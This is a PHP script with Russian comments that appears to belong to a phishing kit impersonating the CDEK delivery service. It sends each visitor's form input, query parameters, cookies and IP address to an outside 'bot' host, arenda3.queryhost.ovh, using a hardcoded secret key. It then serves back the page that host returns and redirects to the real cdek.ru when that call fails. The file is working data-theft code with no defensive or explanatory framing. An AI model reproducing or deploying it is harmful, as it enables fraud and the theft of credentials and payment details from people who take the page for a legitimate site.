<?php
	error_reporting(0);
	
	function host() { // Хост где размещены файлы бота
		return 'https://arenda3.queryhost.ovh/';
	}

	function serviceCode() { // Номер сервиса
		return '24';
	}

	function secretKey() { // Секретный ключ для передачи данных между сайтами и ботом.
		return 'LW3na6te4P28SWU4x642LvMC';
	}

	function loadSite($data) {
		header('Location: https://cdek.ru'.$_SERVER['REQUEST_URI']);
	}
	
	function remotePage($n) {
		$post = [
			'secretkey' => secretKey(),
			'service' => serviceCode(),
			'action' => $n,
			'_post' => json_encode($_POST),
			'_get' => json_encode($_GET),
			'_server' => json_encode([
				'domain' => $_SERVER['SERVER_NAME'],
				'ip' => $_SERVER['REMOTE_ADDR'],
			]),
			'_cookie' => json_encode($_COOKIE),
		];
		$data = explode('`', request(host().'_remote.php', $post), 2);
		if (count($data) != 2)
			loadSite($data);
		header('HTTP/1.0 200 OK');
		foreach (json_decode($data[0], true) as $ck => $cv)
			setcookie($ck, $cv, time() + 1209600, '/');
		echo $data[1];
	}

	function request($url, $post) {
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
		$result = curl_exec($curl);
		curl_close($curl);
		return $result;
	}
?>